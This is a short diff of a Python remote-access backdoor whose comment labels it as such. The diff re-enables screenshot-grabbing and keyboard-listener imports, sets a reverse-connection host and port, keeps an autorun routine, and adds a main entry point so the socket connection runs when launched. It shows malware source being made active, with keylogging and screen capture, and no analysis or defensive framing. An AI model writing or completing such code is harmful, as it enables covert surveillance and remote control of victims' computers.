@@ -11,9 +11,9 @@ import subprocess
 import tempfile
 import os
 import re
-#import pyscreenshot as ImageGrab
+import pyscreenshot as ImageGrab
 from multiprocessing import Process
-#from pynput.keyboard import Listener
+from pynput.keyboard import Listener
 colorama.init()
 RHOST = '127.0.0.1'
 RPORT = 8080
@@ -54,7 +54,6 @@ def autorun():
         pass
         
 # funções da backdoor  
-
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -139,3 +138,6 @@ def repetir():
             time.sleep(5)   
             
             
+            
+if __name__ == '__main__':
+    main()
